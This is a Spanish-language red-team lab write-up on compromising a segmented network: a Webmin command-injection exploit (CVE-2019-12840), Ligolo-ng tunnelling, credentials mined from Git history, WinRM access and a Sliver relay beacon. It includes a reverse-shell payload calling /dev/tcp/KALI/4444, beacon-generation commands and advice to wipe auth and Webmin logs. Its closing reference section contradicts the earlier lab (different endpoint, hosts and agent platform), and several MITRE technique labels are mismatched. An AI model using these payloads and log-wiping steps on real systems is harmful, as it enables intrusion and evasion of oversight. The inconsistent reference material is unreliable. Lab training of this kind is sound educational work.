# Technique — Lab-02 Silent Bridge

> **Capability (eje didáctico):** Acceso vía exploit de aplicación expuesta → pivoting (tunneling) → session passing / relay C2.
> **Bloque CRTO:** Pivoting & Tunneling · Relay C2 en redes segmentadas.
> **Adversario (escenario):** APT41 — ver [`emulation.md`](emulation.md).

---

## 1. Segmentación de red — Por qué existe y cómo se supera


### ¿Qué es la segmentación de red?

La segmentación de red divide la infraestructura en zonas con diferentes niveles de confianza y accesibilidad. El objetivo es limitar el movimiento lateral — si un atacante compromete una máquina en la DMZ, no debería poder alcanzar directamente los servidores internos.

### Modelo típico de segmentación corporativa

```
Internet ──── Firewall ──── DMZ (servidores web, VPN, proxies)
                              │
                           Firewall
                              │
                         Red Interna (servidores de aplicaciones)
                              │
                           Firewall
                              │
                        Red Corporativa (workstations, DCs)
```

### Por qué la segmentación no detiene a un atacante avanzado

La segmentación controla el **tráfico de red** pero no el **comportamiento de las aplicaciones**. Una vez que el atacante controla una máquina en la DMZ, puede:

1. **Tunelizar tráfico** a través de protocolos permitidos (HTTPS, DNS, ICMP)
2. **Usar la máquina comprometida como proxy** hacia la red interna
3. **Explotar aplicaciones** que sí tienen acceso a la red interna (bases de datos, APIs)

La clave es encontrar un **pivote** — una máquina con acceso a múltiples redes.

### Topología de SILENT BRIDGE

```
Internet/Kali (10.0.2.9)
    ↓ Solo acceso a 10.0.2.0/24
PROD Ubuntu (10.0.2.200 / 10.0.3.200) ← PIVOTE
    ↓ Acceso a 10.0.3.0/24 (red interna)
GIT Server (10.0.3.150)
PC-01 Windows (10.0.3.7)
```

PROD es el pivote — tiene una pata en cada red. Comprometer PROD es el 80% del trabajo.

---

## 2. CVE-2019-12840 — Webmin RCE autenticado


### ¿Qué es Webmin?

Webmin es un panel de administración web para sistemas Unix/Linux. Permite gestionar usuarios, servicios, paquetes y configuraciones del sistema desde un navegador. Por defecto escucha en el puerto 10000 con HTTPS.

### La vulnerabilidad

CVE-2019-12840 es un **Command Injection** en el endpoint `/package-updates/update.cgi` de Webmin 1.890.

**Diferencia crítica con CVE-2019-15107:**
- CVE-2019-15107: Pre-autenticación, requiere `passwd_mode=2` en la configuración
- CVE-2019-12840: **Requiere autenticación**, pero el parámetro `u` del endpoint es vulnerable a inyección de comandos

### ¿Por qué existe la vulnerabilidad?

El endpoint `update.cgi` procesa actualizaciones de paquetes y pasa parámetros del usuario directamente a una llamada del sistema sin sanitización:

```perl
# Pseudocódigo simplificado
my $pkg = param('u');
system("apt-get install $pkg");  # ← inyección aquí
```

Un parámetro como `foo; id; #` resulta en:
```bash
apt-get install foo; id; #
```

### Flujo del exploit

```
1. Autenticarse en Webmin (credenciales por defecto o conocidas)
2. POST a /package-updates/update.cgi con u=foo%3bid%3b%23
3. El servidor ejecuta el payload como root
4. Reverse shell o command execution
```

### Por qué el exploit necesita autenticación

El panel de Webmin requiere login. En entornos de lab se usan credenciales por defecto o conocidas. En un engagement real, las credenciales podrían obtenerse via:
- Fuerza bruta (Webmin no tiene lockout por defecto)
- Credenciales por defecto (`root` / contraseña del sistema)
- Credenciales reutilizadas de otros servicios

### Construcción del exploit desde 46984.rb (EDB)

El exploit original de Exploit-DB está en Ruby (Metasploit). Para usarlo standalone en Python se extrae la lógica HTTP:

```python
import requests, urllib3
urllib3.disable_warnings()

url = "https://TARGET:10000/package-updates/update.cgi"
payload = "u=acl%2Fapt+&u=exploit%3b+bash+-c+'bash+-i+>%26+/dev/tcp/KALI/4444+0>%261'%3b+#"
session = requests.Session()
# ... autenticación + POST
```

---

## 3. Tunneling con Ligolo-ng — Teoría y arquitectura


### ¿Por qué necesitamos tunneling?

Tras comprometer PROD (10.0.2.200/10.0.3.200), queremos acceder directamente a GIT (10.0.3.150) y PC-01 (10.0.3.7) desde Kali — como si estuviéramos físicamente en la red interna. El tunneling crea una interfaz de red virtual que enruta el tráfico a través de PROD.

### Cómo funciona Ligolo-ng

Ligolo-ng usa un **túnel TLS** entre un agente (en PROD) y un proxy (en Kali). El proxy crea una interfaz `tuntap` en Kali y enruta el tráfico de la red interna a través de ella.

```
Kali ←──── TLS tunnel ──── PROD (agente)
tun0                           │
10.0.3.0/24 ──────────────────→ red interna
```

**Componentes:**
- **proxy** (en Kali): escucha en un puerto, gestiona el túnel, crea la interfaz tuntap
- **agent** (en PROD): se conecta al proxy, reenvía tráfico entre redes

### Configuración paso a paso

```bash
# En Kali — configurar interfaz tuntap
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 10.0.3.0/24 dev ligolo

# Arrancar proxy
./proxy -selfcert -laddr 0.0.0.0:11601

# En PROD (tras RCE)
./agent -connect 10.0.2.9:11601 -ignore-cert &
```

**¿Por qué TLS?** El túnel cifra el tráfico para evitar detección por IDS/IPS que inspeccionan el contenido del tráfico.

### Alternativas a Ligolo-ng

| Herramienta | Protocolo | OPSEC | Complejidad |
|-------------|-----------|-------|-------------|
| Ligolo-ng | TLS | Alto | Bajo |
| Chisel | HTTP/HTTPS | Medio | Bajo |
| SSHuttle | SSH | Alto | Muy bajo |
| Proxychains + SSH | SSH SOCKS | Alto | Medio |
| ICMP tunnel | ICMP | Muy alto | Alto |

### Diferencia entre SOCKS proxy y tuntap

| SOCKS proxy | tuntap (Ligolo-ng) |
|-------------|-------------------|
| Solo TCP/UDP | TCP, UDP, ICMP |
| Requiere configurar cada tool (`proxychains`) | Transparente — cualquier tool funciona |
| Nmap `-sT` solo (no SYN) | Nmap `-sS` funciona |
| No funciona con herramientas que no soportan SOCKS | Funciona con todo |

---

## 4. Git history — Credenciales en control de versiones


### ¿Por qué aparecen credenciales en Git?

Git mantiene un historial completo de todos los cambios. Un desarrollador que hardcodeó credenciales en un archivo y luego las "eliminó" en un commit posterior no las eliminó realmente — siguen en el historial.

Patrones comunes:
1. **Credenciales en código** (`db_pass = "secreto"`) → "fix: remove hardcoded creds" → sigue en historial
2. **Archivos de configuración** (`.env`, `config.php`) committeados accidentalmente
3. **Tokens de API** en scripts de CI/CD
4. **Claves privadas SSH** committeadas por error

### Comandos para buscar credenciales en Git

```bash
# Ver historial completo
git log --all --oneline

# Ver contenido de un commit específico
git show <commit_hash>

# Buscar strings en el historial completo
git log --all -p | grep -i "password\|passwd\|secret\|token\|key"

# Buscar en todos los commits
git grep -i "password" $(git rev-list --all)
```

### Herramientas especializadas

| Herramienta | Qué hace |
|-------------|----------|
| `truffleHog` | Busca secrets en repos con regex y entropía |
| `gitleaks` | Busca secrets con reglas predefinidas |
| `git-secrets` | Previene commits con credenciales |

### Por qué es un riesgo real y frecuente

Según estudios de GitGuardian, en 2023 se detectaron más de 10 millones de secrets expuestos en repositorios públicos de GitHub. En repos privados corporativos el problema es igual o mayor.

La razón es cultural — los desarrolladores priorizan la velocidad sobre la seguridad y confían en que el repo es "privado".

---

## 5. WinRM — Windows Remote Management como vector


### ¿Qué es WinRM?

WinRM es la implementación de Microsoft de WS-Management — un protocolo basado en SOAP/HTTP para gestión remota de sistemas Windows. Equivalente a SSH para Linux.

**Puertos:**
- 5985 (HTTP)
- 5986 (HTTPS)

### ¿Por qué está habilitado en PC-01?

En entornos corporativos WinRM suele estar habilitado en servidores para administración remota. En workstations es menos común pero no raro en entornos con administración centralizada.

### El problema del perfil de red

WinRM respeta el perfil de red de Windows Firewall:
- **Perfil Privado/Dominio**: WinRM accesible
- **Perfil Público**: WinRM bloqueado por firewall

Si una máquina recién unida al dominio tiene perfil Público, `winrm quickconfig -force` fuerza la configuración ignorando el perfil.

### Autenticación en WinRM

| Método | Seguridad | Uso |
|--------|-----------|-----|
| Kerberos | Alto | Dominio unido |
| NTLM | Medio | Workgroup o dominio |
| Basic | Bajo (requiere HTTPS) | Solo con SSL |
| CredSSP | Medio | Double-hop permitido |

### Double-hop problem

WinRM usa Network Logon (Type 3). Las credenciales no se almacenan en la sesión remota — no puedes usar esas credenciales para autenticarte en un tercer sistema. Esto es el "double-hop problem" y es por qué Rubeus `ptt` no funciona en sesiones WinRM.

**Soluciones:**
- CredSSP (delega credenciales, inseguro)
- Kerberos constrained delegation
- Trabajar desde Kali con impacket en lugar de desde la shell WinRM

---

## 6. Relay C2 — Beacon en redes no accesibles directamente


### El problema

PC-01 (10.0.3.7) no tiene visibilidad hacia Kali (10.0.2.9). Si desplegamos un beacon Sliver en PC-01 apuntando a Kali, el beacon no podrá conectar.

```
PC-01 (10.0.3.7) → [BLOQUEADO] → Kali (10.0.2.9)
```

### La solución: PROD como relay

PROD tiene visibilidad hacia ambas redes. El beacon en PC-01 conecta a PROD, y PROD reenvía la comunicación hacia Kali.

```
PC-01 (10.0.3.7) → PROD (10.0.3.200) → Kali (10.0.2.9)
```

### Configuración en Sliver

```
# En Sliver — crear listener en PROD
listener_add --host 10.0.3.200 --port 443

# Generar beacon apuntando a PROD
generate beacon --http 10.0.3.200:443 --save beacon_pc01.exe
```

### Tipos de listeners en C2

| Tipo | Protocolo | Uso |
|------|-----------|-----|
| HTTP/HTTPS | HTTP | Más común, mimetiza tráfico web |
| mTLS | TLS mutuo | Más seguro, menos detectable |
| DNS | DNS | Extremadamente sigiloso, lento |
| WireGuard | UDP | Alto rendimiento |

### Por qué HTTPS es el estándar

HTTPS en puerto 443 se mimetiza con tráfico web legítimo. Los firewalls rara vez bloquean 443 saliente. Con un certificado válido y un perfil de C2 bien configurado, el tráfico es prácticamente indistinguible de navegación web normal.

---

## 7. Credential Reuse — Reutilización de contraseñas


### El patrón más explotado en engagements reales

Estudios de Verizon DBIR muestran que más del 80% de las brechas relacionadas con credenciales involucran contraseñas reutilizadas o robadas. La reutilización es omnipresente porque:

1. Los humanos tienen dificultad para recordar contraseñas únicas
2. La presión para "no olvidar la contraseña" lleva a usar contraseñas conocidas
3. Las políticas de contraseñas corporativas llevan a patrones predecibles (`Empresa2024!`)

### En SILENT BRIDGE

`thomas:iamthegreatest` aparece en el historial de Git del servidor GIT. La misma contraseña funciona en WinRM de PC-01 porque thomas la reutilizó.

### Cadena típica de credential reuse en un engagement

```
Contraseña en Git/archivo → misma contraseña en SSH/WinRM/RDP
Credencial en memoria LSASS → reutilizada en otros sistemas
Password spraying → misma contraseña de dominio en múltiples sistemas
```

### Password Spraying vs Brute Force

| | Password Spraying | Brute Force |
|--|-------------------|-------------|
| **Contraseñas** | 1-3 contraseñas comunes | Miles/millones |
| **Cuentas** | Muchas cuentas | 1 cuenta |
| **Riesgo lockout** | Muy bajo | Alto |
| **Detección** | Difícil (distribuido en el tiempo) | Fácil |
| **Efectividad** | Alta en entornos corporativos | Baja |

---

## Comandos de referencia

> El operator log paso a paso vive en `execution/`. Aquí, los comandos núcleo.

### Webmin RCE (acceso inicial)

```bash
# Ejemplo: Command injection en parámetro de Webmin
curl "http://target:10000/cgi/rpc.cgi?action=...&cmd=id"

# O vía Metasploit/custom exploit
# Resultado: salida de comando ejecutado como usuario webmin (often root)
```

### Tunneling / Pivoting (Ligolo-ng)

```
Tu Kali → Ligolo Agent (Windows) → DC/WKSTN/DNS (red interna)
        └─ SOCKS5 proxy 127.0.0.1:1080
```

### C2 a través del túnel

```bash
# En Kali, listener escucha en localhost
sliver > https -l 127.0.0.1 -p 8443

# Payload generado apunta a 127.0.0.1:8443 (que es tunelado a través de Ligolo)
sliver > generate --https 127.0.0.1:8443

# Ejecutas payload en servidor Windows comprometido
# Beacon conecta a 127.0.0.1:8443 (que es tu Kali)
# Pero el tráfico de red real va:
# Windows Beacon → Ligolo Agent → Ligolo Server (tu Kali) → Sliver C2
```

## Equivalencia CS ↔ Sliver

| Operación | Cobalt Strike | Sliver | Notas |
|-----------|---|---|---|
| **Web RCE** | Impacket vía payload | Same (shell + reverse) | RCE es independiente de C2 |
| **Tunneling** | Beacon SOCKS | Ligolo-ng agent | CS integrado; Sliver vía herramienta externa |
| **C2 over tunnel** | Listener en proxy | Listener local + proxy | Mismo concepto |
| **Pivoting** | `beacon -p 8080` | Ligolo relay | Different naming |

---

## MITRE ATT&CK

| Táctica | Técnica | ID | Lab-02 |
|---------|---------|----|----|
| Initial Access | Exploit Public-Facing Application | T1190 | Webmin RCE |
| Execution | Command and Scripting | T1059 | RCE commands |
| Defense Evasion | Proxy | T1090.004 | SOCKS tunnel via Ligolo |
| Command & Control | Non-Standard Port | T1571 | Beacon vía tunnel |
| Lateral Movement | Remote Service Session Hijacking | T1570 | Pivoting a través de agente |

---

## Tradecraft & OPSEC en entornos segmentados


### Principio fundamental: cuantos menos saltos, mejor

Cada sistema comprometido es un artefacto adicional que puede ser detectado. El objetivo es el camino más corto desde el acceso inicial hasta el objetivo final.

### Qué genera ruido en entornos segmentados

| Acción | Riesgo de detección | Por qué |
|--------|---------------------|---------|
| Subir agente Ligolo a PROD | Medio | Binario no firmado en disco |
| Conexión TLS saliente en puerto no estándar | Medio | Puerto 11601 inusual |
| Escaneo Nmap de la red interna | Alto | Tráfico de discovery anómalo |
| Conexiones WinRM desde IP nueva | Medio | Autenticación desde origen no habitual |
| Ejecución de binarios en PC-01 | Alto | Proceso no firmado |

### Mitigaciones OPSEC aplicadas en este lab

1. **Ligolo-ng en lugar de Chisel** — TLS con certificado propio es más difícil de inspeccionar
2. **Nmap discreto** — `-sT -p 22,80,443,445,3389,5985` en lugar de escaneo completo
3. **Relay C2 en lugar de beacon directo** — reduce la superficie de comunicación
4. **evil-winrm en lugar de powershell remoting** — menos eventos de auditoría

### Limpieza en entornos segmentados

- Eliminar el agente Ligolo de PROD tras el engagement
- Eliminar el beacon de PC-01
- Limpiar logs de `/var/log/auth.log` en PROD (si es necesario)
- Restablecerlas contraseñas comprometidas (si es un engagement real)

---

### OPSEC por técnica

### Webmin RCE
- **Riesgo:** Logs del servidor (Webmin access logs, syslog)
- **Mitigación:** Ofuscar payload, borrar logs tras foothold

### SOCKS Tunneling
- **Riesgo:** Tráfico inusual (procesos sospechosos, conexiones de red)
- **Mitigación:** Ejecutar agente como servicio, usar puerto legítimo si es posible

### C2 over Tunnel
- **Riesgo:** Doble capa (tunnel + beacon) genera más telemetría
- **Mitigación:** Sleep/jitter aún más importante; minimizar comandos

---

## Key Takeaways

1. **Web apps son entry point real:** No siempre comienza por phishing; a menudo por RCE web.
2. **Tunneling es fundamental:** Para operar en red segmentada, necesitas pivote.
3. **Ligolo (o equivalente) es herramienta crítica:** No es opcional si hay segmentación.
4. **C2 a través de tunnel = latencia extra:** Comandos más lentos, ajusta expectations.

---

*Theory · Lab-02 Silent Bridge · Web RCE & Pivoting*

## Referencias


- [NVD CVE-2019-12840](https://nvd.nist.gov/vuln/detail/CVE-2019-12840)
- [Ligolo-ng GitHub](https://github.com/nicocha30/ligolo-ng)
- [MITRE ATT&CK — APT41](https://attack.mitre.org/groups/G0096/)
- [TruffleHog — Secret Scanning](https://github.com/trufflesecurity/trufflehog)
- [Verizon DBIR 2023](https://www.verizon.com/business/resources/reports/dbir/)

---

*Operación SILENT BRIDGE — Adrián Camacho | Mayo 2026*  
*Entorno de laboratorio — Únicamente con fines educativos*

---

*Technique · Lab-02 Silent Bridge · fusión theory+tradecraft (anatomía v3.1)*